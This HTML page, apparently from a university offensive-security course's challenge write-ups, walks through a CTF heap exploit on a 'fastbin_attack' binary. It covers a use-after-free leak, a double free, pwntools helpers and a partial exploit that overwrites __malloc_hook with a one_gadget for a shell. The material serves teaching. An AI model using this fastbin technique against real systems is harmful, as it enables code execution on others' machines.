@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.725804997873">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 2.4.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Heap</title>
+    <meta name="title" content="Heap">
+    <meta name="description" content="We are given the loader because there may be inconsistencies with the given libc and the system loader:" />
+
+    <!-- Canonical -->
+    <link rel="canonical" href="/04-heap/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="/04-heap/">
+    <meta property="og:title" content="Heap">
+    <meta property="og:description" content="We are given the loader because there may be inconsistencies with the given libc and the system loader:">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="/04-heap/">
+    <meta property="twitter:title" content="Heap">
+    <meta property="twitter:description" content="We are given the loader because there may be inconsistencies with the given libc and the system loader:">
+
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../resources/css/retype.css?v=2.4.0.725804997873" rel="stylesheet" />
+
+    <script type="text/javascript" src="../resources/js/config.js?v=2.4.0.725804997873" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.4.0.725804997873" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.4.0.725804997873" defer></script>
+    <link href="../resources/css/katex.css?v=2.4.0" rel="stylesheet" />
+    <script id="katex-js" type="text/javascript" src="../resources/js/katex.js?v=2.4.0" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../" class="flex items-center leading-snug text-xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Offensive and Defensive Cybersecurity [2021/2022] [056896]</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Challenges summary &amp; write-up</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+        
+                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
+                        </div>
+        
+                        <!-- Mobile search button mock -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placehokder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button mock -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+                </div>
+            
+                <div class="pl-6 mb-4 mt-1">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="grow min-w-0 px-6 md:px-16">
+                        <main class="relative pt-6 pb-16">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="heap" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#heap">#</doc-anchor-trigger>
+        <span>Heap</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="fastbin-attack">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#fastbin-attack">#</doc-anchor-trigger>
+        <span>fastbin-attack</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="environment-setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#environment-setup">#</doc-anchor-trigger>
+        <span>Environment setup</span>
+    </h3>
+</doc-anchor-target>
+<p>We are given the loader because there may be inconsistencies with the given <code v-pre>libc</code> and the system loader:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">&gt; ls
+fastbin_attack  ld-2.23.so  libc-2.23.so  port</code></pre>
+</doc-codeblock></div>
+<p>How do we bind the given loader and <code v-pre>libc</code> to the binary?</p>
+<ol>
+<li><p>Fastest way: set the <code v-pre>LD_PRELOAD</code> environmental variable:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">LD_PRELOAD=./libc-2.23.so ./binary</code></pre>
+</doc-codeblock></div>
+<p>This solution uses system&#x27;s loader.</p>
+</li>
+<li><p>To use both a different loader and a different library:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./ld-2.23.so --library-path ./lib ./binary</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Most sofisticated way:</p>
+<p><a href="https://github.com/NixOS/patchelf">NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)</a></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"> patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc-2.23.so ./binary</code></pre>
+</doc-codeblock></div>
+<p>To check which library a binary (<code v-pre>./binary</code>) we can use <code v-pre>ldd ./binary</code>.</p>
+</li>
+</ol>
+<p>If we run <code v-pre>fastbin-attack</code> with the 1st method we get a <code v-pre>SEGFAULT</code>, because we need also the loader. Also the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./ld-2.23.so --library-path ./lib ./fastbin-attack</code></pre>
+</doc-codeblock></div>
+<p>goes in <code v-pre>SEGFAULT</code>.</p>
+<doc-anchor-target id="note-on-ghidra-pseudo-c-readability">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#note-on-ghidra-pseudo-c-readability">#</doc-anchor-trigger>
+        <span>note on Ghidra pseudo C readability</span>
+    </h3>
+</doc-anchor-target>
+<p>While exploring the pseudo C generated by Ghidra, we notice that some pieces of code are very hard to read, like disassembled <code v-pre>while</code> loops:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">  while (((int)i &lt; 100 &amp;&amp; (*(long *)(entries + (long)(int)i * 0x10) != 0))) {
+    i = i + 1;
+  }</code></pre>
+</doc-codeblock></div>
+<p>Since we are incresing the size of the single item, we need to decrease the number of array cells (<span class="math">1600*1=200*8</span>). Result:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">  while (((int)i &lt; 100 &amp;&amp; (entries[(long)(int)i * 2] != 0))) {
+    i = i + 1;
+  }</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="what-does-it-do">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#what-does-it-do">#</doc-anchor-trigger>
+        <span>What does it do</span>
+    </h3>
+</doc-anchor-target>
+<p>Basically the binary manipulates lists that have the following structure:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Pointer to return</th>
+<th>space</th>
+</tr>
+</thead>
+</table>
+</div>
+<p><del>Then we have another list that contains zero or one depending if the pointer contained in the first column is valid or not.</del> Actually we have no second list, retyping in Ghidra fixed that for us. It allows us to allocate, write and free some text by using the heap.</p>
+<p><strong>A problem with <code v-pre>read_entry</code></strong></p>
+<p>The <code v-pre>read_entry</code> function has a security vulnerability:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void read_entry(void)
+
+{
+  int iVar1;
+
+  printf(&quot;Index: &quot;);
+  iVar1 = read_integer();
+  if ((iVar1 &lt; 0) || (99 &lt; iVar1)) {
+    puts(&quot;Index out of range!&quot;);
+  }
+  else {
+    if (entries[(long)iVar1 * 2] == 0) {
+      puts(&quot;Not allocated yet!&quot;);
+    }
+    else {
+      puts((char *)entries[(long)iVar1 * 2]);
+    }
+  }
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p>It prints the <code v-pre>entries</code> variable after checking if the pointer is valid, but <strong>it does not check if the pointer has been freed</strong>. This is a memory leak. If you are wondering what that check should look like, this is the relevent snippet from the <code v-pre>write_entry</code> function:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">...
+else {
+    if (*(char *)((long)entries + (long)i * 16 + 12) == '\x01') {
+        puts(&quot;Can\'t write on a freed entry!&quot;);
+}
+...</code></pre>
+</doc-codeblock></div>
+<p>The check is performed against the state list that was introduced before.</p>
+<p><strong>Note</strong>: <code v-pre>entries</code> is a global variable.</p>
+<p><strong>how to put breakpoints in PIE binaries</strong></p>
+<p>Given the address of a certain instruction in a disassembled binary, for example we can call it <code v-pre>&lt;ADDR&gt;</code>, we can still put a breakpoint in it:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">gdb.attach(r, '''
+    brva &lt;ADDR&gt; &lt;BINARY&gt;
+    c
+''')</code></pre>
+</doc-codeblock></div>
+<p><strong>more improvements on disassembled code readability</strong></p>
+<p>After retyping the structure used by the binary, we get the following code for the <code v-pre>write_entry</code> function:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void write_entry(void)
+
+{
+  int i;
+  printf(&quot;Index: &quot;);
+  i = read_integer();
+  if ((i &lt; 0) || (99 &lt; i)) {
+    puts(&quot;Index out of range!&quot;);
+  }
+  else {
+    if (*(char *)((long)&amp;entries[i].size + 4) == '\x01') {
+      puts(&quot;Can\'t write on a freed entry!&quot;);
+    }
+    else {
+      if (entries[i].msg == (char *)0x0) {
+         puts(&quot;Not allocated yet!&quot;);
+      }
+      else {
+         printf(&quot;Content: &quot;);
+         read(0,entries[i].msg,(ulong)*(uint *)&amp;entries[i].size);
+         entries[i].msg[*(int *)&amp;entries[i].size - 1] = '\0';
+         puts(&quot;Done!&quot;);
+      }
+    }
+  }
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p>Which is much better if you ask me. Still something is wrong:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">if (*(char *)((long)&amp;entries[i].size + 4) == '\x01')</code></pre>
+</doc-codeblock></div>
+<p>This probably means that <code v-pre>size</code> actually is not a <code v-pre>long</code> (8 bytes), but it is an <code v-pre>int</code> (4 bytes). If we edit the structure according to this, it would have a <code v-pre>char*</code> and two <code v-pre>int</code>. New pseudo code of the same function:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void write_entry(void)
+
+{
+  int i; 
+  printf(&quot;Index: &quot;);
+  i = read_integer();
+  if ((i &lt; 0) || (99 &lt; i)) {
+    puts(&quot;Index out of range!&quot;);
+  }
+  else {
+    if (*(char *)&amp;entries[i].freed == '\x01') {
+      puts(&quot;Can\'t write on a freed entry!&quot;);
+    }
+    else {
+      if (entries[i].msg == (char *)0) {
+         puts(&quot;Not allocated yet!&quot;);
+      }
+      else {
+         printf(&quot;Content: &quot;);
+         read(0,entries[i].msg,(ulong)(uint)entries[i].size);
+         entries[i].msg[entries[i].size - 1] = '\0';
+         puts(&quot;Done!&quot;);
+      }
+    }
+  }
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p>Which is actually readable.</p>
+<p><strong>A problem with <code v-pre>free_entry</code></strong></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void free_entry(void)
+{
+  uint i;
+  printf(&quot;Index: &quot;);
+  i = read_integer();
+  if (((int)i &lt; 0) || (99 &lt; (int)i)) {
+    puts(&quot;Index out of range!&quot;);
+  }
+  else {
+    free(entries[i].msg);
+    *(undefined *)&amp;entries[i].freed = 1;
+    printf(&quot;Index %d freed!\n&quot;,(ulong)i);
+  }
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<p>Same as the other function: there is no check in place. We can free a chunk more than once. This means that we can basically print everything we want, which means that we can also leak the address of <code v-pre>libc</code>.</p>
+<doc-anchor-target id="the-exploit-in-theory">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-exploit-in-theory">#</doc-anchor-trigger>
+        <span>The exploit in theory</span>
+    </h3>
+</doc-anchor-target>
+<ol>
+<li><p>vulnerability: <code v-pre>read_entry</code>, can be used to leak stuff.</p>
+</li>
+<li><p>vulnerability: <code v-pre>free_entry</code>, we can free more than once chunks -&gt; fastbin attack to make <code v-pre>malloc</code> allocate something in memory: the address of <code v-pre>system()</code> into either <code v-pre>__free_hook</code> or <code v-pre>__malloc_hook</code>.</p>
+<p>More specifically when overwriting <code v-pre>__free_hook</code> we overwrite it with <code v-pre>system</code> and we pass <code v-pre>/bin/sh</code> to it. Instead when we overwrite <code v-pre>__malloc_hook</code>  we use <code v-pre>one_gadget</code> since the parameter of the <code v-pre>malloc</code> is a number, not a string.</p>
+</li>
+</ol>
+<doc-anchor-target id="the-exploit-in-practice">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-exploit-in-practice">#</doc-anchor-trigger>
+        <span>The exploit in practice</span>
+    </h3>
+</doc-anchor-target>
+<p><strong>simplifying the process</strong></p>
+<p>To change loader and library with pwntools (if we do not want to use the patched binary):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">r = ssh.process(&quot;./fa/ld-2.23.so --library-path ./fa ./fa/fastbin_attack&quot;.split(&quot; &quot;))</code></pre>
+</doc-codeblock></div>
+<p>Assuming that the parent folder containing all the needed files is called <code v-pre>fa</code>.</p>
+<p>To simplify the work we will build functions in python to interact with the functions of the binary, which are:</p>
+<ol>
+<li><code v-pre>alloc</code></li>
+<li><code v-pre>write_entry</code></li>
+<li><code v-pre>read_entry</code></li>
+<li><code v-pre>free_entry</code></li>
+</ol>
+<p>So, for example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def alloc(size):
+    r.recvuntil(b'&gt; ')
+    r.sendline(b'1')
+    r.recvuntil(b'Size: ')
+    r.sendline(b'%d', % size)</code></pre>
+</doc-codeblock></div>
+<p>We will also need to parse the index which gets printed by the function:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">import re
+
+def alloc(size):
+    ...
+    m = re.match(b&quot;Allocated at index (\d+)!&quot;, indexline)
+    return int(m.group(1))</code></pre>
+</doc-codeblock></div>
+<p>Same for writing chunks:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def write_chunk(index, content):
+    r.recvuntil(b&quot;&gt; &quot;)
+    r.sendline(b&quot;2&quot;)
+    r.recvuntil(b&quot;Index: &quot;)
+    r.sendline(b&quot;%d&quot; % index)
+    r.recvuntil(b&quot;Content: &quot;)
+    r.send(content)</code></pre>
+</doc-codeblock></div>
+<p>And for reading and freeing:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def read_chunk(index):
+    r.recvuntil(b&quot;&gt; &quot;)
+    r.sendline(b&quot;3&quot;)
+    r.recvuntil(b&quot;Index: &quot;)
+    r.sendline(b&quot;%d&quot; % index)
+    data = r.recvuntil(b&quot;Options:\n&quot;)
+    return data[:-len(b&quot;Options:\n&quot;)]    # we need to process received output
+                                        # we remove 'Output:\n' from received
+                                        # output
+
+def free_chunk(index):
+    r.recvuntil(b&quot;&gt; &quot;)
+    r.sendline(b&quot;4&quot;)
+    r.recvuntil(b&quot;Index: &quot;)
+    r.sendline(b&quot;%d&quot; % index)</code></pre>
+</doc-codeblock></div>
+<p>Now that we can interact easily with the functions we can build the actual exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">chunk_a = alloc(0x200)
+chunk_b = alloc(0x30)
+free_chunk(chunk_a)
+libc_leak = u64(read_chunk(chunk_a)[:6]+b&quot;\x00\x00&quot;)
+libc_base = libc_leak - 0x3c4b78
+
+print(&quot;[!] libc_leak: %#x&quot; % libc_leak)
+print(&quot;[!] libc_base: %#x&quot; % libc_base)</code></pre>
+</doc-codeblock></div>
+<p><strong>Part 1: leaking libc address</strong></p>
+<p>We need to leak <code v-pre>libc</code>, how do we do it? We allocate a small bin and <strong>free it</strong>, since after the free it will contain an address to a location which is is located into libc:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">chunk_a = alloc(0x200)
+free(chunk_a)
+print(chunk_a, read(chunk_a))    </code></pre>
+</doc-codeblock></div>
+<p>This happens because when we have only one chunk it will contain a random libc address, from which we can compute the address of the base of the libc. To find the offset we will use <code v-pre>vmmap</code> in gdb.</p>
+<p><strong>Part 2: exploiting <del><code v-pre>__free_hook</code></del> <code v-pre>__malloc_hook</code> to spawn a shell</strong></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">chunk_c = alloc(size)
+chunk_d = alloc(size)
+
+free_chunk(chunk_c)
+free_chunk(chunk_d)
+free_chunk(chunk_c)</code></pre>
+</doc-codeblock></div>
+<p>By allocating two chunks and freeing both of them, and again the first one, we will get a loop: <code v-pre>chunk_1</code> points to <code v-pre>chunk_2</code> and vice versa. Then</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">chunk_A = alloc(SIZE)
+write_chunk(b'A'*8)
+
+chunk_B = alloc(SIZE)
+chunk_C = alloc(SIZE)
+# trigger
+chunk_D = alloc(SIZE)</code></pre>
+</doc-codeblock></div>
+<p>Will result in <code v-pre>0x4141414141414141</code> becoming ?. Now we can put the address of <code v-pre>__free_hook </code> in its place.</p>
+<p>Still the program crashes because the <code v-pre>malloc</code> realizes that there&#x27;s a mismatch with the size of the bin. We need to find some bytes not zeroed that are located before our target and try to match the size with those bytes, since they will be our new size for the chunk.</p>
+<p>If we do not find those bytes we can search elsewhere, for example near <code v-pre>__malloc_hook</code>.</p>
+<p>We find that before <code v-pre>__malloc_hook</code> we have an address, but we know that after translating it to decimal it would be a gigantic number. We could exploit the alignment to take only part of it. For example we can go from <code v-pre>0x7ffff7...</code> to <code v-pre>0x7f</code>. To align we just add some bytes to the address of the cell to &#x27;cut&#x27; its content according to our needs.</p>
+<p>Then we take the address of that cell, we compute its offset, and put it in our script in place of <code v-pre>__malloc_hook</code>. Full exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python"># part 1: leaking libc address
+input('press any key to start exploiting...')
+chunk_a = alloc(0x200)
+chunk_b = alloc(0x30)
+free_chunk(chunk_a)
+libc_leak = u64(read_chunk(chunk_a)[:6]+b&quot;\x00\x00&quot;)
+
+# libc base address found by checking the base of libc with
+# mmap in gdb, and then computing the difference wrt the
+# address just printed
+libc_base = libc_leak - 0x3c4b78
+malloc_hook = libc_base + malloc_hook_offset
+one_gadget = libc_base + magic_gadget
+
+print('[!] malloc_hook: %#x' % malloc_hook)
+print('[!] libc_leak: %#x' % libc_leak)
+print('[!] libc_base: %#x' % libc_base)
+print('[!] one_gadget: %#x' % one_gadget)
+
+# part 2: the exploit
+chunk_c = alloc(size)
+chunk_d = alloc(size)
+
+# we created the loop
+free_chunk(chunk_c)
+free_chunk(chunk_d)
+free_chunk(chunk_c)
+
+# the vuln code will use chunk_c like it's both still allocated
+# and like it is not
+# which means that we can write a target address into memory
+# and we can override the hook of the malloc function to get
+# arbitrary code execution when its called
+chunk_c = alloc(size)
